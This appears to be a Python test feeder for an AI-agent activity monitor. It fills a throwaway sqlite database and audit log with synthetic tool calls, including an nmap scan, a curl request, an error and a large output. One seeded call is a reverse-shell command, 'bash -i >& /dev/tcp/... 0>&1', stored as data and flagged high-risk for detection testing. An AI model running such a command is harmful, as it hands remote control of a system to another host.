"""Synthetic test feeder for the Goose Activity Monitor.

Writes a small, deterministic set of sessions/messages into a throwaway
sqlite db using the Goose schema (tables: sessions, messages) AND appends
matching lines to a fake audit.log, so a Collector pointed at these two
files ingests a controlled stream exercising:

  - a benign INTERNAL nmap tool_call
  - an EXTERNAL curl (referenced, via shell command text)
  - an exit-code-1 error tool_call
  - a tool_call with a ~14,293-char response
  - a reverse-shell tool_call (bash -i >& /dev/tcp/... 0>&1)

Goose's messages.created_timestamp is epoch SECONDS; SessionsReader
multiplies by 1000 to get ms. Audit log lines use "ts" as epoch seconds
(float). To make audit correlation land inside AuditIndex's 60s window,
each tool_call's audit "ts" must equal the REQUEST message's
created_timestamp (both on the same seconds scale) -- the emitted event's
timestamp_ms is derived from the request row, not the response row.

Usage as a library:
    from tests import feeder
    feeder.populate(goose_db_path, audit_log_path)

Usage as a CLI:
    python3 -m tests.feeder <goose_db_path> <audit_log_path>
"""
import json
import sqlite3
import sys

REVERSE_SHELL_CMD = "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
BIG_RESPONSE_LEN = 14293

SESSION_ID = "demo_1"
SESSION_NAME = "Reverse Shell Test"
SESSION_CREATED_AT = "2026-08-17 00:00:00"
SESSION_WORKING_DIR = "/home/demo"


def _ensure_schema(db):
    db.execute(
        "CREATE TABLE IF NOT EXISTS sessions("
        "id TEXT PRIMARY KEY, name TEXT, working_dir TEXT, created_at TIMESTAMP)"
    )
    db.execute(
        "CREATE TABLE IF NOT EXISTS messages("
        "id INTEGER PRIMARY KEY AUTOINCREMENT, message_id TEXT, session_id TEXT, "
        "role TEXT, content_json TEXT, created_timestamp INTEGER)"
    )


def _insert_message(db, session_id, role, content, ts_seconds):
    db.execute(
        "INSERT INTO messages(session_id,role,content_json,created_timestamp) "
        "VALUES(?,?,?,?)",
        (session_id, role, json.dumps(content), ts_seconds),
    )


def _tool_call(db, audit_lines, session_id, call_id, tool, arguments,
               req_ts, resp_ts, stdout="", stderr="", exit_code=0,
               is_error=False, tier="LOW", decision="APPROVED:auto",
               outcome="ok"):
    """Insert a paired toolRequest/toolResponse plus a matching audit line."""
    req_item = {
        "type": "toolRequest",
        "id": call_id,
        "toolCall": {"value": {"name": tool, "arguments": arguments}},
        "_meta": {"goose_extension": "gateway"},
    }
    resp_item = {
        "type": "toolResponse",
        "id": call_id,
        "toolResult": {
            "value": {
                "structuredContent": {
                    "stdout": stdout, "stderr": stderr, "exit_code": exit_code,
                },
                "isError": is_error,
                "content": [{"type": "text", "text": stdout or ""}],
            }
        },
    }
    _insert_message(db, session_id, "assistant", [req_item], req_ts)
    _insert_message(db, session_id, "user", [resp_item], resp_ts)
    audit_lines.append(json.dumps({
        "ts": float(req_ts), "tool": tool, "tier": tier, "decision": decision,
        "outcome": outcome, "args": arguments,
    }))


def populate(goose_db_path, audit_log_path):
    """Fill goose_db_path (sqlite) and audit_log_path (jsonl) with a
    deterministic synthetic stream for session `demo_1`, "Reverse Shell Test".
    """
    db = sqlite3.connect(goose_db_path)
    try:
        _ensure_schema(db)
        db.execute(
            "INSERT INTO sessions(id,name,working_dir,created_at) VALUES(?,?,?,?)",
            (SESSION_ID, SESSION_NAME, SESSION_WORKING_DIR, SESSION_CREATED_AT),
        )

        audit_lines = []

        # 1) benign INTERNAL nmap scan
        _tool_call(
            db, audit_lines, SESSION_ID, "call_nmap", "nmap",
            {"target": "192.168.50.1", "top_ports": 100},
            req_ts=1000, resp_ts=1001,
            stdout="PORT 22/tcp open ssh", stderr="", exit_code=0,
            tier="LOW",
        )

        # 2) curl to an external host, referenced from shell command text
        _tool_call(
            db, audit_lines, SESSION_ID, "call_curl", "sandbox_bash",
            {"command": "curl https://example.com"},
            req_ts=1002, resp_ts=1003,
            stdout="<html>ok</html>", stderr="", exit_code=0,
            tier="LOW",
        )

        # 3) exit-code-1 error
        _tool_call(
            db, audit_lines, SESSION_ID, "call_false", "sandbox_bash",
            {"command": "false"},
            req_ts=1004, resp_ts=1005,
            stdout="", stderr="", exit_code=1,
            tier="LOW",
        )

        # 4) a very large response (~14,293 chars)
        _tool_call(
            db, audit_lines, SESSION_ID, "call_big", "sandbox_bash",
            {"command": "cat bigfile.txt"},
            req_ts=1006, resp_ts=1007,
            stdout="A" * BIG_RESPONSE_LEN, stderr="", exit_code=0,
            tier="LOW",
        )

        # 5) reverse shell
        _tool_call(
            db, audit_lines, SESSION_ID, "call_revshell", "sandbox_bash",
            {"command": REVERSE_SHELL_CMD},
            req_ts=1008, resp_ts=1009,
            stdout="", stderr="", exit_code=0,
            tier="HIGH",
        )

        db.commit()
    finally:
        db.close()

    with open(audit_log_path, "a") as f:
        for line in audit_lines:
            f.write(line + "\n")


def _main(argv):
    if len(argv) != 3:
        print(f"usage: {argv[0]} <goose_db_path> <audit_log_path>", file=sys.stderr)
        return 2
    goose_db_path, audit_log_path = argv[1], argv[2]
    populate(goose_db_path, audit_log_path)
    print(f"fed synthetic data: goose_db={goose_db_path} audit_log={audit_log_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(_main(sys.argv))
